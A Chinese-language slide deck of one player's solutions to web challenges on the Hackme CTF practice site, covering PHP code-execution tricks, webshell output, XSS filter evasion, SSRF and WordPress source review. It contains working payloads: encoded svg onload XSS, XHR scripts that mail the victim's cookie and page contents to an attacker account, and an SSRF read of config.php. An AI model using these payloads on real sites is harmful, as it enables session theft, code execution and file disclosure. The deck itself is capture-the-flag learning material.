### 第一次解 
# [Hackme CTF](https://hackme.inndy.tw/)
### 就上手

jason3e7 20190716

Note:title:"第一次解Hackme CTF就上手"

---

# Web
* [dafuq-manager 1](#/2)
* [dafuq-manager 2](#/3)
* [dafuq-manager 3](#/10)
* [xssme](#/22)
* [xssrf leak](#/32)
* [wordpress 1](#/39)
* [wordpress 2](#/44)
* [webshell](#/48)

---

## dafuq-manager 1 hint
* ```Do you know cookie? Create a cookie named `help` with value `me`!```
* [Back to Web](#/1)

---

## dafuq-manager 2 hint
* 目標 : 登入 admin
* 如果可以快速架環境, 就架環境.(黑箱變成白箱)
  * conf, https -> http
* 分析權限管控機制, 登入流程
* 切入點
  * bypass權限管控, 直接顯示 admin 頁面
  * 登入驗證
    * Injection
  * 抓取密碼檔 
    * Path Traversal

Note:index.php?action=x

---

### dafuq-manager 2 - 分析權限管控機制
* index.php(action = admin)
  * /core/fun_admin.php
    * show_admin()
      * $GLOBALS["permissions"] from activate_user().

---

### dafuq-manager 2 - 分析登入流程
* /core/login.php
  * activate_user()
    * md5(stripslashes($p_pass)))
  * /core/fun_users.php
    * /.config/.htusers.php, 帳號資料檔(包含密碼)
    * &find_user()

---

### dafuq-manager 2 - bypass權限管控, 直接顯示 admin 頁面
* /core/login.php
  * activate_user()
  * /core/fun_users.php
    * /.config/.htusers.php, $GLOBALS["permissions"]都從這包帶出.
* 目前沒有辦法走這條路 Compromise. 

---

## dafuq-manager 2 - 登入驗證
* &find_user function
  * $pass == NULL
    * 如果是等於 0, 就有[Magic Hashes](https://www.whitehatsec.com/blog/magic-hashes/)可以用.
  * 不是 SQL, 沒有 SQL injection
* 目前沒有辦法走這條路 Compromise. 

---

## dafuq-manager 2 - 抓取密碼檔
* search and list
  * 只顯示檔案不是存取
* download
  * basename(), protect
* arch
  * I got you !
* debug
  * dafuq-manager 3 的入口

---

## dafuq-manager 2 - arch
* /core/fun_archive.php
  * zip_items
    * ```$GLOBALS['__POST']["selitems"][$i]```
    * sanitize()
* /core/secure.php
  * sanitize(), 不安全
* [Back to Web](#/1)

---

## dafuq-manager 3 hint
* 目標 : 使用 webshell, 取得網站目錄底下的 flag 
* 切入點
  * /core/fun_debug.php
    * eval()  
* 步驟
  * [step 1, bypass strcmp()](#/11)
  * [step 2, construct webshell](#/15)
    * make_command()
  * [step 3, linux !?](#/21)
    * 以為要提權, 實際上不用, 寫對語法就好.

Note:index.php?action=x

---

## dafuq-manager 3 debug
* /core/init.php
  * $GLOBALS["dir"]
* /core/fun_debug.php
  * strcmp($dir, "magically")...
  * [Unauthorized Access: Bypassing PHP strcmp()](http://danuxx.blogspot.com/2013/03/unauthorized-access-bypassing-php-strcmp.html)
* [Back to dafuq-manager 3 hint](#/10)

---

## dafuq-manager 3 learn
* php 執行系統外部命令
  * system('ls');
  * passthru('ls');
  * print(exec('ls'));
  * print(shell_exec('ls'));
  * print(\`ls\`); 
  * print(fread(popen('ls', 'r'), 2096));

Note:escapeshellcmd()

---

## dafuq-manager 3 learn
* php 執行系統外部命令
  * proc_open
    * ```$process = proc_open('ls', array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")), $pipes); print(stream_get_contents($pipes[1]));```
  * pcntl_exec, 需要補充
  * ob_start(), 需要補充

---

## dafuq-manager 3 learn
* php 執行php外部命令
  * eval("phpinfo();");
  * assert(), 需要補充
  * print(preg_replace_callback('/cmd/e', phpinfo(), 'cmd'));
  * $func = create_function('$arg1', 'phpinfo();'); $func(1);

Note:
eval(base64_decode('c3lzdGVtKCdscycpOw=='));

---

## dafuq-manager 3 learn
* php 執行php外部命令
  * array_map('phpinfo', array(0, 1));
    * 限制只有 function name
  * ```$_GET["func"]($_GET["argument"]);```
* [Back to dafuq-manager 3 hint](#/10)

Note: ReflectionFunction()

---

## dafuq-manager 3 learn
* php, code inclusion
  * include
  * include_once
  * require
  * require_once
  * curl, 需要補充, 不一定在這個分類.

Note:
[Exploitable PHP functions](https://stackoverflow.com/questions/3115559/exploitable-php-functions)

```include("data:text/plain;base64,$_GET[code]");```, need test.

順便有的 keyword : 
* [利用環境變數LD_PRELOAD來繞過php disable_function執行系統命令 <轉載>](https://codertw.com/%E4%BC%BA%E6%9C%8D%E5%99%A8/138881/)
* [Exploit with PHP Protocols / Wrappers](https://www.cdxy.me/?p=752)
* [Finding vulnerabilities in PHP scripts (FULL)](https://www.exploit-db.com/papers/12871)
* [Web-shells 101 using PHP – Introduction to Web Shells – Part 2](https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/)
* [List of PHP Exploitation Code](https://securityonline.info/list-php-exploitation-codephp-exploitation-codephp-object-injectioncommand-execution/)
* [File Operation Induced Unserialization via the “phar://” Stream Wrapper](https://cdn2.hubspot.net/hubfs/3853213/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-....pdf)
* [php代码/命令执行漏洞](https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/)

---

## dafuq-manager 3 linux
* /etc/passwd
  * UID
  * GID
* /etc/group
  * 支援的帳號名稱

---

## dafuq-manager 3 /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
flag3:x:1001:1001::/home/flag3:
```

---

## dafuq-manager 3 /etc/group
```
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
gnats:x:41:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
systemd-journal:x:101:
systemd-timesync:x:102:
systemd-network:x:103:
systemd-resolve:x:104:
systemd-bus-proxy:x:105:
flag3:x:1001:
```

---

## dafuq-manager 3 webshell
* whoami
  * www-data
* file
  * flag3/meow: setuid, setgid executable, regular file, no read permission
  * flag3/flag3: regular file, no read permission

---

## dafuq-manager 3 webshell
* ls -al flag3/
```
total 32
drwxr-xr-x  2 root  root  4096 Jan 25  2018 .
drwxr-xr-x 13 root  root  4096 Jul 30 08:33 ..
-rw-r--r--  1 root  root   161 Oct  4  2016 Makefile
-r--------  1 flag3 flag3   72 Oct  4  2016 flag3
-rws--s--x  1 flag3 flag3 9232 Oct  4  2016 meow
-rw-r--r--  1 root  root   783 Oct  4  2016 meow.c
```
* [Back to Web](#/1)

Note:[Web渗透测试（4）—本地提权方法](https://www.jianshu.com/p/955e6715c450)
ls;whoami;

---

## xssme hint
* 目標 : XSS admin to steal flag 
* 切入點
  * 是一個 email 系統, 可以寄信給別人.
* 步驟
  * [step1, input, 找出可以污染的參數](#/23)
  * [step2, filter, 找出沒有被過濾的語法](#/24)
  * [step3, construct, 建構語法](#/31)
    * 要先想好要達成什麼目的

Note:更重要的問題是, 這個環境是怎麼建置的.

---

## xssme input
* username
* password
* to_user
* subject
* content
* proof\_of\_work
* [Back to xssme hint](#/22)

---

## xssme filter
* content filter(part)
  * )
  * <script
  * &nbsp;onload
  * &nbsp;onerror
  * location.href
  * eval
* pass
```
<a>a</a>, <img src="HTMLencode(javascript:alert(1);)">
<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
```
* [Back to xssme hint](#/22)

Note:[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Basic_XSS_Test_Without_Filter_Evasion)

---

## xssme encode
* HTML encode
  * [Decimal HTML character references](https://www.hashemian.com/tools/html-url-encode-decode.php)
    * htmlEncode("&lt;script>alert(1)&lt;/script>"), 的運作原理是先轉成 HTML 之後, 全部都被當成符號, 所以不會運行.
    * `<img src="htmlEncode">`, 的運作原理是先轉成 HTML 之後, 被 src 語法運行.
  * Hexadecimal HTML character references

Note:
* [詳細解說幾個建置網站時常用的編碼方法](https://blog.miniasp.com/post/2008/11/05/Explain-web-related-encoding-decoding-method-in-detail.aspx)
* URL encode
* base64 encode
* Unicode 方式進行編碼

---

## xssme construct 1
* sample code
```
location.href = 'sendmail.php?to=hacker';
document.getElementById("to_user").value = "hacker";
document.getElementById("subject").value = "cookie";
document.getElementById("content").value = document.cookie;
im_robot.click();
document.getElementsByTagName("form")[0].submit();
```
* challenge
  * how to pass javascript to sendmail page
    * setTimeout();
  * sendmail page parameter(to)
    * 漏網之魚, no filter.

---

## xssme construct 1
* sendmail.php?to=
* ">&lt;script>alert(1);&lt;/script><" 
  * `setTimeout(function(){alert(1)},3000);`
    * `alert(1);im_robot.click();`
    * `console.log(document.getElementById('subject').value);`
    * `document.getElementById('subject').setAttribute('value','cookie');`
      * 因為 = 號在轉拋的時候會 urlEncode, 到下一頁 javascript 不會運行 urlEncode 後的 %3d.

---

## xssme construct 1
* ">&lt;script>setTimeout(function(){
```
document.getElementById("to_user").setAttribute("value","hacker");
document.getElementById("subject").setAttribute("value",document.cookie);
document.getElementById("content").setAttribute("value","cookie");
im_robot.click();
document.getElementsByTagName("form")[0].setAttribute("method","POST");
```
* },3000);&lt;/script><"

Note:
* 其實還在思考 im_robot 的運作原理, 還有是不是要等待秒數.
* 使用 burp 在 sendmail page, 直接貼在 to 參數, 沒有被 urlEncode 的程式碼, 可以在 firefox 運行.

---

## xssme construct 1 Failed !
* location.href='sendmail.php?to=
  * ">&lt;script>setTimeout(function(){
```
document.getElementById("to_user").setAttribute("value","hacker");
document.getElementById("subject").setAttribute("value",document.cookie);
document.getElementById("content").setAttribute("value","cookie");
im_robot.click();
document.getElementsByTagName("form")[0].setAttribute("method","POST");
```
  * },3000);&lt;/script><"
* ';

Note:
* 在 Browser 的 console 貼入 payload 送出, 結果 ", >, <, 送出前在 javascript 就被 urlEncode 了, 到 sendmail page, 不能 work.
* 當然整包 htmlEncode 放到 content 也是相似的結果.

---

## xssme construct 2
* sample code, 直接寫 ajax post sendmail page 吧.
```
var xhttp = new XMLHttpRequest();
xhttp.open("POST", "sendmail.php");
xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhttp.send("to_user=hacker&subject=cookie&content="+document.cookie);
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "setadmin.php");
xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhttp.send("to_user=hacker&subject=cookie&content="+document.cookie);
```

---

## xssme construct 2
```
<svg/onload=&#x76;&#x61;&#x72;&#x20;&#x78;&#x68;&#x74;&#x74;&#x70;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x58;&#x4d;&#x4c;&#x48;&#x74;&#x74;&#x70;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x28;&#x29;&#x3b;&#x0a;&#x78;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x6f;&#x70;&#x65;&#x6e;&#x28;&#x22;&#x50;&#x4f;&#x53;&#x54;&#x22;&#x2c;&#x20;&#x22;&#x73;&#x65;&#x6e;&#x64;&#x6d;&#x61;&#x69;&#x6c;&#x2e;&#x70;&#x68;&#x70;&#x22;&#x29;&#x3b;&#x0a;&#x78;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x73;&#x65;&#x74;&#x52;&#x65;&#x71;&#x75;&#x65;&#x73;&#x74;&#x48;&#x65;&#x61;&#x64;&#x65;&#x72;&#x28;&#x22;&#x43;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x2d;&#x54;&#x79;&#x70;&#x65;&#x22;&#x2c;&#x20;&#x22;&#x61;&#x70;&#x70;&#x6c;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2f;&#x78;&#x2d;&#x77;&#x77;&#x77;&#x2d;&#x66;&#x6f;&#x72;&#x6d;&#x2d;&#x75;&#x72;&#x6c;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x65;&#x64;&#x22;&#x29;&#x3b;&#x0a;&#x78;&#x68;&#x74;&#x74;&#x70;&#x2e;&#x73;&#x65;&#x6e;&#x64;&#x28;&#x22;&#x74;&#x6f;&#x5f;&#x75;&#x73;&#x65;&#x72;&#x3d;&#x61;&#x62;&#x63;&#x64;&#x65;&#x26;&#x73;&#x75;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x3d;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x26;&#x63;&#x6f;&#x6e;&#x74;&#x65;&#x6e;&#x74;&#x3d;&#x22;&#x2b;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x63;&#x6f;&#x6f;&#x6b;&#x69;&#x65;&#x29;&#x3b;>
```
* [Back to Web](#/1)

---

## xssrf leak hint
* 目標 : Steal flag from source code file
* 切入點
  * 延續 xssme
  * [SSRF](https://ctf-wiki.github.io/ctf-wiki/web/ssrf/)
* 步驟
  * [step1, search, 找出目標](#/37)
  * [step2, construct, 建構語法](#/38)

Note:
* google 搜尋 XSSRF 就會找一些關鍵字, 有一點勝之不武
  * robots.txt, 要重新學習並整合滲透測試的網站資訊收集, 給一個 domain, 要收集哪些東西.
  * request.php
  * 有點可惜, 應該好好看看 SSRF 應該可以自己找的到, 很多 web 的還是不熟, 放下身段學習.
* SSRF 不熟, 其實可以快一點建立測試環境, 會比較快.

---

## xssrf leak cookie
* PHPSESSID = xxx
  * Admin only allowed from localhost, but you came from 192.168.123.1
    * [如何正確的取得使用者 IP？](https://devco.re/blog/2014/06/19/client-ip-detection/) 
    * Client-IP
    * X-Forwarded-For
    * REMOTE_ADDR
    * ...
* 但是方向看起來錯了

---

## xssrf leak construct 1
```
var xhttp = new XMLHttpRequest();
xhttp.open("POST", "sendmail.php");
xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhttp.send("to_user=abcde&subject=cookie&content="+btoa(document.documentElement.innerHTML));
```
Note:<svg/onload=>

---

## xssrf leak html
* sendmail.php
* index.php
* setadmin.php
* request.php

---

## xssrf leak construct 2
```
var xhttp = new XMLHttpRequest();
xhttp.open("POST", "setadmin.php");
xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhttp.onreadystatechange = function() { 
if (this.readyState === XMLHttpRequest.DONE) {
  var xhttp1 = new XMLHttpRequest();
  xhttp1.open("POST", "sendmail.php");
  xhttp1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
  xhttp1.send("to_user=abcde&subject=cookie&content="+btoa(this.responseText));
}};
xhttp.send("username=abcde");
```
* 帳號毀滅 !

---

## xssrf leak search
* robots.txt
```
User-agent: *
Disallow: /config.php
Disallow: /you/cant/read/config.php/can/you?
Disallow: /backup.zip
```
* [Back to xssme leak hint](#/32)

---

## xssrf leak construct 3
```
var xhttp = new XMLHttpRequest();
xhttp.open("POST", "request.php");
xhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhttp.onreadystatechange = function() { 
if (this.readyState === XMLHttpRequest.DONE) {
  var xhttp1 = new XMLHttpRequest();
  xhttp1.open("POST", "sendmail.php");
  xhttp1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
  xhttp1.send("to_user=ababc&subject=cookie&content="+btoa(this.responseText));
}};
xhttp.send("url=file:///var/www/html/config.php");
```
* [Back to Web](#/1)

Note:路徑猜測是 ubuntu 預設路徑

---

## wordpress 1 hint
* 目標 : Something strange is hidding in the source code, find it.
* 切入點
  * 就是到處看看, 要有耐心和細心
* 步驟
  * [step1, website, 找出目標](#/41)
  * [step2, source code, 找出目標](#/42)
  * [step3, bypass, 分析和建構語法](#/43)

---

## wordpress 1 visible
* [index](https://wp.hackme.inndy.tw) HTML
  * javascript, window._wpemojiSettings
* [login](https://wp.hackme.inndy.tw/wp-login.php)
* [feed](https://wp.hackme.inndy.tw/feed)
* [comments](https://wp.hackme.inndy.tw/comments/feed)
* [wp-json](https://wp.hackme.inndy.tw/wp-json/)
* [wlwmanifest.xml](https://wp.hackme.inndy.tw/wp-includes/wlwmanifest.xml)

Note:
* 還有一些 wordpress 預設可能會安裝的東西和路徑沒試
* 還有一些網站預設的也要測試. ex:robots.txt

---

## wordpress 1 page
* [sample-page](https://wp.hackme.inndy.tw/sample-page)
* [Backup File](https://wp.hackme.inndy.tw/archives/96)
  * [dropbox](https://www.dropbox.com/s/r5fk52thwh79kzw/web-security-course-game2.7z?dl=0)
* [受保護的文章：FLAG2](https://wp.hackme.inndy.tw/archives/78)
* 有很多的下載
  * [CimiCimi小女僕機器人 Source Code](https://wp.hackme.inndy.tw/archives/16)
    * [Download](http://www.mediafire.com/download/tsf8dfs83whqr4x/cimicimi_source.7z) 
* [Back to wordpress 1 hint](#/39)

Note:
* [新楓之谷免開網頁登入器](https://wp.hackme.inndy.tw/archives/7)
  * [NewBeanfunLogin.7z](https://docs.google.com/file/d/0BwCCAN51pvN5RzNkNWxua2kwWlU/edit)
* [CimiCimi小女僕機器人 Source Code](https://wp.hackme.inndy.tw/archives/16)
  * [Download](http://www.mediafire.com/download/tsf8dfs83whqr4x/cimicimi_source.7z)
* [MS Speed Pick — 楓之谷撿物加速程式](https://wp.hackme.inndy.tw/archives/50)
  * [MS_SpeedPick.7z](https://sites.google.com/site/isblogspot/attach/MS_SpeedPick.7z?attredirects=0&d=1)

---

## wordpress 1 backup
* source code review
  * login
  * database
  * php function bypass
  * keyword : flag
    * core
* [Back to wordpress 1 hint](#/39)

---

## wordpress 1 core
* md5() = 5ada11fd9c69c78ea65c832dd7f9bbde
  * rainbow table
* wp_get_user_ip()
  * wp-includes/functions.php
    * $_SERVER['REMOTE_ADDR']
* mcrypt_decrypt()
  * AUTH_KEY, AUTH_SALT, from !?
* [Back to Web](#/1)
  
Note:有可能遠端自己解嗎?

---

## wordpress 2 hint
* 目標 : Something strange is hidding in the source code, find it.
* 切入點
  * from wordpress 1, theme
* 步驟
  * [step1, source code, 找出目標](#/45)
  * [step2, website, 找出目標](#/47)

---

## wordpress 2 theme
* keyword
  * parameter 
    * GET
    * POST
    * REQUEST
  * php function
    * eval()
    * ...

Note:search 'GET[' at theme folder 

---

## wordpress 2 content-search
* `$wp_query->post->{'post_'.(string)($_GET['debug']?:'type')}`
* [Class Reference/WP Post](https://codex.wordpress.org/Class_Reference/WP_Post)
* [Back to wordpress 2 hint](#/44)

---

## wordpress 2 page
* 參考 wordpress 1, 要有耐心和細心
* [受保護的文章：FLAG2](https://wp.hackme.inndy.tw/archives/78)
* [Back to Web](#/1)

---

## webshell hint
* 目標 : find webshell to steal flag 
* 切入點
  * 要仔細觀察, 不要漏掉一些細節
  * 建立 webshell payload
* [Back to Web](#/1)

Note:
* 要記得使用 curl 試試看.
* 直接建立環境測試比較快.

---

# The End
